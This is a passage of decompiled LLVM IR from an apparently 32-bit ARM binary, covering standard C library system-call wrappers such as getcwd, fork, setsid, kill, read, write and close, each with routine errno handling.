  br i1 %tmp, label %dec_label_pc_12cc0, label %dec_label_pc_12cb0

dec_label_pc_12cb0:                               ; preds = %entry
  %v0_12cb0 = call i32 @__GI___errno_location()
  %v0_12cb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_12cb4 = sub i32 0, %v0_12cb4
  %v2_12cb8 = inttoptr i32 %v0_12cb0 to i32*
  store i32 %v1_12cb4, i32* %v2_12cb8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12cc0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12cc0

dec_label_pc_12cc0:                               ; preds = %entry, %dec_label_pc_12cb0
  %v1_12cc4 = phi i32 [ %v0_12ca0, %entry ], [ -1, %dec_label_pc_12cb0 ]
  %v2_12cc0 = phi i32 [ %v3_12c94, %entry ], [ %v2_12cc0.pre, %dec_label_pc_12cb0 ]
  store i32 %v2_12cc0, i32* @r7, align 4
  ret i32 %v1_12cc4

; uselistorder directives
  uselistorder i32 %v0_12ca0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12cc0, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_12cc8 = load i32, i32* @r4, align 4
  %v6_12cc8 = load i32, i32* @r5, align 4
  %v9_12cc8 = load i32, i32* @r6, align 4
  %v12_12cc8 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_12ccc = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_12cdc = icmp eq i32 %arg1, 0
  br i1 %v2_12ccc, label %dec_label_pc_12cdc, label %dec_label_pc_12d0c

dec_label_pc_12cdc:                               ; preds = %entry
  br i1 %v2_12cdc, label %dec_label_pc_12cf8, label %dec_label_pc_12ce4

dec_label_pc_12ce4:                               ; preds = %dec_label_pc_12cdc
  %v0_12ce4 = call i32 @__GI___errno_location()
  %v0_12ce8 = load i32, i32* @r6, align 4
  store i32 %v0_12ce8, i32* @r4, align 4
  %v2_12cf0 = inttoptr i32 %v0_12ce4 to i32*
  store i32 22, i32* %v2_12cf0, align 4
  br label %dec_label_pc_12da4

dec_label_pc_12cf8:                               ; preds = %dec_label_pc_12cdc
  %v0_12cf8 = call i32 @__GI_getpagesize()
  %v5_12d00 = icmp slt i32 %v0_12cf8, 4096
  br i1 %v5_12d00, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_12cf8
  store i32 %v0_12cf8, i32* @r7, align 4
  br label %dec_label_pc_12d1c

bb16:                                             ; preds = %dec_label_pc_12cf8
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_12d1c

dec_label_pc_12d0c:                               ; preds = %entry
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_12cdc, label %dec_label_pc_12d1c, label %bb17

bb17:                                             ; preds = %dec_label_pc_12d0c
  br label %dec_label_pc_12d30

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12d0c, %bb, %bb16
  %v0_12d1c = phi i32 [ %v0_12cf8, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_12d0c ]
  %v1_12d20 = call i32 @malloc(i32 %v0_12d1c)
  %v2_12d24 = icmp eq i32 %v1_12d20, 0
  br i1 %v2_12d24, label %dec_label_pc_12da0, label %dec_label_pc_12d2c

dec_label_pc_12d2c:                               ; preds = %dec_label_pc_12d1c
  br label %dec_label_pc_12d30

dec_label_pc_12d30:                               ; preds = %bb17, %dec_label_pc_12d2c
  %storemerge = phi i32 [ %arg1, %bb17 ], [ %v1_12d20, %dec_label_pc_12d2c ]
  %v0_12d74 = phi i32 [ %arg1, %bb17 ], [ %v1_12d20, %dec_label_pc_12d2c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 %v0_12d74, i32* @r7, align 4
  %tmp = icmp ult i32 %v0_12d74, -4095
  br i1 %tmp, label %dec_label_pc_12d5c, label %dec_label_pc_12d4c

dec_label_pc_12d4c:                               ; preds = %dec_label_pc_12d30
  %v0_12d4c = call i32 @__GI___errno_location()
  %v0_12d50 = load i32, i32* @r7, align 4
  %v1_12d50 = sub i32 0, %v0_12d50
  %v2_12d54 = inttoptr i32 %v0_12d4c to i32*
  store i32 %v1_12d50, i32* %v2_12d54, align 4
  br label %dec_label_pc_12d8c

dec_label_pc_12d5c:                               ; preds = %dec_label_pc_12d30
  %v1_12d5c = icmp slt i32 %v0_12d74, 0
  br i1 %v1_12d5c, label %dec_label_pc_12d8c, label %dec_label_pc_12d64

dec_label_pc_12d64:                               ; preds = %dec_label_pc_12d5c
  %v0_12d64 = load i32, i32* @r4, align 4
  %v2_12d64 = icmp eq i32 %v0_12d64, 0
  br i1 %v2_12d64, label %bb18, label %dec_label_pc_12d80.thread7

dec_label_pc_12d80.thread7:                       ; preds = %dec_label_pc_12d64
  br label %dec_label_pc_12da4

bb18:                                             ; preds = %dec_label_pc_12d64
  %v1_12d68 = load i32, i32* @r6, align 4
  %v3_12d68 = icmp eq i32 %v1_12d68, 0
  br i1 %v3_12d68, label %dec_label_pc_12d80, label %dec_label_pc_12d80.thread

dec_label_pc_12d80.thread:                        ; preds = %bb18
  br label %bb19

dec_label_pc_12d80:                               ; preds = %bb18
  %v2_12d78 = inttoptr i32 %v0_12d74 to i32*
  %v3_12d78 = call i32 @realloc(i32* %v2_12d78, i32 %v0_12d74)
  store i32 %v3_12d78, i32* @r4, align 4
  %v2_12d80 = icmp eq i32 %v3_12d78, 0
  br i1 %v2_12d80, label %dec_label_pc_12d80.bb19_crit_edge, label %dec_label_pc_12da4

dec_label_pc_12d80.bb19_crit_edge:                ; preds = %dec_label_pc_12d80
  %v1_12d84.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_12d80.bb19_crit_edge, %dec_label_pc_12d80.thread
  %v1_12d84 = phi i32 [ %v1_12d84.pre, %dec_label_pc_12d80.bb19_crit_edge ], [ %v0_12d74, %dec_label_pc_12d80.thread ]
  store i32 %v1_12d84, i32* @r4, align 4
  br label %dec_label_pc_12da4

dec_label_pc_12d8c:                               ; preds = %dec_label_pc_12d5c, %dec_label_pc_12d4c
  %v0_12d8c = load i32, i32* @r4, align 4
  %v2_12d8c = icmp eq i32 %v0_12d8c, 0
  br i1 %v2_12d8c, label %dec_label_pc_12d94, label %dec_label_pc_12da0

dec_label_pc_12d94:                               ; preds = %dec_label_pc_12d8c
  %v0_12d94 = load i32, i32* @r5, align 4
  store i32 %v0_12d94, i32* @r0, align 4
  %v0_12d98 = call i32 @free()
  br label %dec_label_pc_12da4

dec_label_pc_12da0:                               ; preds = %dec_label_pc_12d8c, %dec_label_pc_12d1c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12da4

dec_label_pc_12da4:                               ; preds = %dec_label_pc_12d80.thread7, %bb19, %dec_label_pc_12d80, %dec_label_pc_12d94, %dec_label_pc_12ce4, %dec_label_pc_12da0
  %v0_12da4 = load i32, i32* @r4, align 4
  store i32 %v3_12cc8, i32* @r4, align 4
  store i32 %v6_12cc8, i32* @r5, align 4
  store i32 %v9_12cc8, i32* @r6, align 4
  store i32 %v12_12cc8, i32* @r7, align 4
  ret i32 %v0_12da4

; uselistorder directives
  uselistorder i32 %v0_12d74, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v1_12d20, { 1, 0, 2 }
  uselistorder i32 %v0_12cf8, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_12da4, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_12d30, { 1, 0 }
  uselistorder label %dec_label_pc_12d1c, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_12dc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 96) to i32*), align 4
  %v1_12dc4 = inttoptr i32 %v4_12dc0 to i32*
  %v2_12dc4 = load i32, i32* %v1_12dc4, align 4
  %v2_12dc8 = icmp eq i32 %v2_12dc4, 0
  br i1 %v2_12dc8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_12dd0 = phi i32 [ %v2_12dc4, %entry ], [ 4096, %bb ]
  ret i32 %v1_12dd0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_12dec = load i32, i32* @r0, align 4
  ret i32 %v1_12dec
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_12df4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_12e04 = call i32 @gettimeofday(i32 %v2_12df4, i32 0)
  %v2_12e08 = load i32, i32* %stack_var_-16, align 4
  %v2_12e0c = icmp eq i32* %arg1, null
  br i1 %v2_12e0c, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_12e08, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_12e08

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12e54, label %dec_label_pc_12e44

dec_label_pc_12e44:                               ; preds = %entry
  %v0_12e44 = call i32 @__GI___errno_location()
  %v0_12e48 = load i32, i32* %r4.global-to-local, align 4
  %v1_12e48 = sub i32 0, %v0_12e48
  %v2_12e4c = inttoptr i32 %v0_12e44 to i32*
  store i32 %v1_12e48, i32* %v2_12e4c, align 4
  br label %dec_label_pc_12e54

dec_label_pc_12e54:                               ; preds = %entry, %dec_label_pc_12e44
  %v1_12e5c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12e44 ]
  ret i32 %v1_12e5c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e54, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e60 = load i32, i32* @r7, align 4
  store i32 %v3_12e60, i32* %stack_var_-8, align 4
  %v0_12e6c = load i32, i32* @r0, align 4
  store i32 %v0_12e6c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e6c, -4095
  br i1 %tmp, label %dec_label_pc_12e8c, label %dec_label_pc_12e7c

dec_label_pc_12e7c:                               ; preds = %entry
  %v0_12e7c = call i32 @__GI___errno_location()
  %v0_12e80 = load i32, i32* %r7.global-to-local, align 4
  %v1_12e80 = sub i32 0, %v0_12e80
  %v2_12e84 = inttoptr i32 %v0_12e7c to i32*
  store i32 %v1_12e80, i32* %v2_12e84, align 4
  %v2_12e8c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e8c

dec_label_pc_12e8c:                               ; preds = %entry, %dec_label_pc_12e7c
  %v1_12e90 = phi i32 [ %v0_12e6c, %entry ], [ -1, %dec_label_pc_12e7c ]
  %v2_12e8c = phi i32 [ %v3_12e60, %entry ], [ %v2_12e8c.pre, %dec_label_pc_12e7c ]
  store i32 %v2_12e8c, i32* @r7, align 4
  ret i32 %v1_12e90

; uselistorder directives
  uselistorder i32 %v0_12e6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e8c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_12ea0 = load i32, i32* @r0, align 4
  %v1_12ea0 = load i32, i32* @r1, align 4
  %v2_12ea0 = call i32 @wait4(i32 %v0_12ea0, i32 %v1_12ea0)
  ret i32 %v2_12ea0
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12ee0, label %dec_label_pc_12ed0

dec_label_pc_12ed0:                               ; preds = %entry
  %v0_12ed0 = call i32 @__GI___errno_location()
  %v0_12ed4 = load i32, i32* %r4.global-to-local, align 4
  %v1_12ed4 = sub i32 0, %v0_12ed4
  %v2_12ed8 = inttoptr i32 %v0_12ed0 to i32*
  store i32 %v1_12ed4, i32* %v2_12ed8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ee0

dec_label_pc_12ee0:                               ; preds = %entry, %dec_label_pc_12ed0
  %v0_12ee0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12ed0 ]
  ret i32 %v0_12ee0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ee0, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ef0 = load i32, i32* @r7, align 4
  store i32 %v3_12ef0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12f18, label %dec_label_pc_12f08

dec_label_pc_12f08:                               ; preds = %entry
  %v0_12f08 = call i32 @__GI___errno_location()
  %v0_12f0c = load i32, i32* %r7.global-to-local, align 4
  %v1_12f0c = sub i32 0, %v0_12f0c
  %v2_12f10 = inttoptr i32 %v0_12f08 to i32*
  store i32 %v1_12f0c, i32* %v2_12f10, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12f1c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12f18

dec_label_pc_12f18:                               ; preds = %entry, %dec_label_pc_12f08
  %v2_12f1c = phi i32 [ %v3_12ef0, %entry ], [ %v2_12f1c.pre, %dec_label_pc_12f08 ]
  %v0_12f18 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12f08 ]
  store i32 %v2_12f1c, i32* @r7, align 4
  ret i32 %v0_12f18

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f18, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f24 = load i32, i32* @r7, align 4
  store i32 %v3_12f24, i32* %stack_var_-8, align 4
  %v0_12f30 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12f30, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12f30, -4095
  br i1 %tmp, label %dec_label_pc_12f50, label %dec_label_pc_12f40

dec_label_pc_12f40:                               ; preds = %entry
  %v0_12f40 = call i32 @__GI___errno_location()
  %v0_12f44 = load i32, i32* %r7.global-to-local, align 4
  %v1_12f44 = sub i32 0, %v0_12f44
  %v2_12f48 = inttoptr i32 %v0_12f40 to i32*
  store i32 %v1_12f44, i32* %v2_12f48, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12f50.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12f50

dec_label_pc_12f50:                               ; preds = %entry, %dec_label_pc_12f40
  %v1_12f54 = phi i32 [ %v0_12f30, %entry ], [ -1, %dec_label_pc_12f40 ]
  %v2_12f50 = phi i32 [ %v3_12f24, %entry ], [ %v2_12f50.pre, %dec_label_pc_12f40 ]
  store i32 %v2_12f50, i32* @r7, align 4
  ret i32 %v1_12f54

; uselistorder directives
  uselistorder i32 %v0_12f30, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12f50, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_12f5c = ptrtoint i32* %stack_var_-16 to i32
  %v2_12f68 = call i32 @getrlimit(i32 7, i32 %v2_12f5c)
  %v1_12f6c = icmp slt i32 %v2_12f68, 0
  %v5_12f70 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_12f6c, i32 256, i32 %v5_12f70
  ret i32 %storemerge
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f84 = load i32, i32* @r7, align 4
  store i32 %v3_12f84, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12fac, label %dec_label_pc_12f9c

dec_label_pc_12f9c:                               ; preds = %entry
  %v0_12f9c = call i32 @__GI___errno_location()
  %v0_12fa0 = load i32, i32* %r7.global-to-local, align 4
  %v1_12fa0 = sub i32 0, %v0_12fa0
  %v2_12fa4 = inttoptr i32 %v0_12f9c to i32*
  store i32 %v1_12fa0, i32* %v2_12fa4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12fb0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12fac

dec_label_pc_12fac:                               ; preds = %entry, %dec_label_pc_12f9c
  %v2_12fb0 = phi i32 [ %v3_12f84, %entry ], [ %v2_12fb0.pre, %dec_label_pc_12f9c ]
  %v0_12fac = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12f9c ]
  store i32 %v2_12fb0, i32* @r7, align 4
  ret i32 %v0_12fac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12fac, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fb8 = load i32, i32* @r7, align 4
  store i32 %v3_12fb8, i32* %stack_var_-8, align 4
  %v0_12fc4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fc4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fc4, -4095
  br i1 %tmp, label %dec_label_pc_12fe4, label %dec_label_pc_12fd4

dec_label_pc_12fd4:                               ; preds = %entry
  %v0_12fd4 = call i32 @__GI___errno_location()
  %v0_12fd8 = load i32, i32* %r7.global-to-local, align 4
  %v1_12fd8 = sub i32 0, %v0_12fd8
  %v2_12fdc = inttoptr i32 %v0_12fd4 to i32*
  store i32 %v1_12fd8, i32* %v2_12fdc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12fe4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12fe4

dec_label_pc_12fe4:                               ; preds = %entry, %dec_label_pc_12fd4
  %v1_12fe8 = phi i32 [ %v0_12fc4, %entry ], [ -1, %dec_label_pc_12fd4 ]
  %v2_12fe4 = phi i32 [ %v3_12fb8, %entry ], [ %v2_12fe4.pre, %dec_label_pc_12fd4 ]
  store i32 %v2_12fe4, i32* @r7, align 4
  ret i32 %v1_12fe8

; uselistorder directives
  uselistorder i32 %v0_12fc4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12fe4, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_13028 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13028, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13028, -4095
  br i1 %tmp, label %dec_label_pc_13048, label %dec_label_pc_13038

dec_label_pc_13038:                               ; preds = %entry
  %v0_13038 = call i32 @__GI___errno_location()
  %v0_1303c = load i32, i32* %r7.global-to-local, align 4
  %v1_1303c = sub i32 0, %v0_1303c
  %v2_13040 = inttoptr i32 %v0_13038 to i32*
  store i32 %v1_1303c, i32* %v2_13040, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13048

dec_label_pc_13048:                               ; preds = %entry, %dec_label_pc_13038
  %v1_13054 = phi i32 [ %v0_13028, %entry ], [ -1, %dec_label_pc_13038 ]
  ret i32 %v1_13054

; uselistorder directives
  uselistorder i32 %v0_13028, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13048, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_13094 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13094, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13094, -4095
  br i1 %tmp, label %dec_label_pc_130b4, label %dec_label_pc_130a4

dec_label_pc_130a4:                               ; preds = %entry
  %v0_130a4 = call i32 @__GI___errno_location()
  %v0_130a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_130a8 = sub i32 0, %v0_130a8
  %v2_130ac = inttoptr i32 %v0_130a4 to i32*
  store i32 %v1_130a8, i32* %v2_130ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_130b4

dec_label_pc_130b4:                               ; preds = %entry, %dec_label_pc_130a4
  %v1_130c0 = phi i32 [ %v0_13094, %entry ], [ -1, %dec_label_pc_130a4 ]
  ret i32 %v1_130c0

; uselistorder directives
  uselistorder i32 %v0_13094, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_130b4, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_130c4 = load i32, i32* @r7, align 4
  store i32 %v3_130c4, i32* %stack_var_-8, align 4
  %v0_130d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_130d0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_130d0, -4095
  br i1 %tmp, label %dec_label_pc_130f0, label %dec_label_pc_130e0

dec_label_pc_130e0:                               ; preds = %entry
  %v0_130e0 = call i32 @__GI___errno_location()
  %v0_130e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_130e4 = sub i32 0, %v0_130e4
  %v2_130e8 = inttoptr i32 %v0_130e0 to i32*
  store i32 %v1_130e4, i32* %v2_130e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_130f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_130f0

dec_label_pc_130f0:                               ; preds = %entry, %dec_label_pc_130e0
  %v1_130f4 = phi i32 [ %v0_130d0, %entry ], [ -1, %dec_label_pc_130e0 ]
  %v2_130f0 = phi i32 [ %v3_130c4, %entry ], [ %v2_130f0.pre, %dec_label_pc_130e0 ]
  store i32 %v2_130f0, i32* @r7, align 4
  ret i32 %v1_130f4

; uselistorder directives
  uselistorder i32 %v0_130d0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_130f0, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_130f8 = load i32, i32* @r7, align 4
  store i32 %v3_130f8, i32* %stack_var_-8, align 4
  %v0_13104 = load i32, i32* @r0, align 4
  store i32 %v0_13104, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13104, -4095
  br i1 %tmp, label %dec_label_pc_13124, label %dec_label_pc_13114

dec_label_pc_13114:                               ; preds = %entry
  %v0_13114 = call i32 @__GI___errno_location()
  %v0_13118 = load i32, i32* %r7.global-to-local, align 4
  %v1_13118 = sub i32 0, %v0_13118
  %v2_1311c = inttoptr i32 %v0_13114 to i32*
  store i32 %v1_13118, i32* %v2_1311c, align 4
  %v2_13124.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13124

dec_label_pc_13124:                               ; preds = %entry, %dec_label_pc_13114
  %v1_13128 = phi i32 [ %v0_13104, %entry ], [ -1, %dec_label_pc_13114 ]
  %v2_13124 = phi i32 [ %v3_130f8, %entry ], [ %v2_13124.pre, %dec_label_pc_13114 ]
  store i32 %v2_13124, i32* @r7, align 4
  ret i32 %v1_13128

; uselistorder directives
  uselistorder i32 %v0_13104, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13124, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_1312c = load i32, i32* @r3, align 4
  store i32 %v9_1312c, i32* %stack_var_-4, align 4
  %v2_13138 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_13138, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1316c, label %dec_label_pc_1315c

dec_label_pc_1315c:                               ; preds = %entry
  %v0_1315c = call i32 @__GI___errno_location()
  %v0_13160 = load i32, i32* %r7.global-to-local, align 4
  %v1_13160 = sub i32 0, %v0_13160
  store i32 %v1_13160, i32* @r3, align 4
  %v2_13164 = inttoptr i32 %v0_1315c to i32*
  store i32 %v1_13160, i32* %v2_13164, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1316c

dec_label_pc_1316c:                               ; preds = %entry, %dec_label_pc_1315c
  %v0_1316c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1315c ]
  ret i32 %v0_1316c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1316c, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13184.outer

dec_label_pc_13184.outer:                         ; preds = %dec_label_pc_1319c, %entry
  %v0_13184.ph = phi i32 [ %v0_13184.pre.pre, %dec_label_pc_1319c ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_13184.ph, -4095
  br label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %dec_label_pc_13184.outer, %dec_label_pc_13184
  br i1 %tmp, label %dec_label_pc_13184, label %dec_label_pc_1319c

dec_label_pc_1319c:                               ; preds = %dec_label_pc_13184
  %v0_1319c = call i32 @__GI___errno_location()
  %v1_131a0 = sub i32 0, %v0_13184.ph
  %v2_131a4 = inttoptr i32 %v0_1319c to i32*
  store i32 %v1_131a0, i32* %v2_131a4, align 4
  %v0_13184.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13184.outer

; uselistorder directives
  uselistorder i32 %v0_13184.ph, { 1, 0 }
  uselistorder label %dec_label_pc_13184, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_131ac = load i32, i32* @r7, align 4
  store i32 %v3_131ac, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_131d8, label %dec_label_pc_131c8

dec_label_pc_131c8:                               ; preds = %entry
  %v0_131c8 = call i32 @__GI___errno_location()
  %v0_131cc = load i32, i32* %r7.global-to-local, align 4
  %v1_131cc = sub i32 0, %v0_131cc
  %v2_131d0 = inttoptr i32 %v0_131c8 to i32*
  store i32 %v1_131cc, i32* %v2_131d0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_131dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_131d8

dec_label_pc_131d8:                               ; preds = %entry, %dec_label_pc_131c8
  %v2_131dc = phi i32 [ %v3_131ac, %entry ], [ %v2_131dc.pre, %dec_label_pc_131c8 ]
  %v0_131d8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_131c8 ]
  store i32 %v2_131dc, i32* @r7, align 4
  ret i32 %v0_131d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131d8, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_131e4 = load i32, i32* @r7, align 4
  store i32 %v3_131e4, i32* %stack_var_-8, align 4
  %v0_131f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_131f0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_131f0, -4095
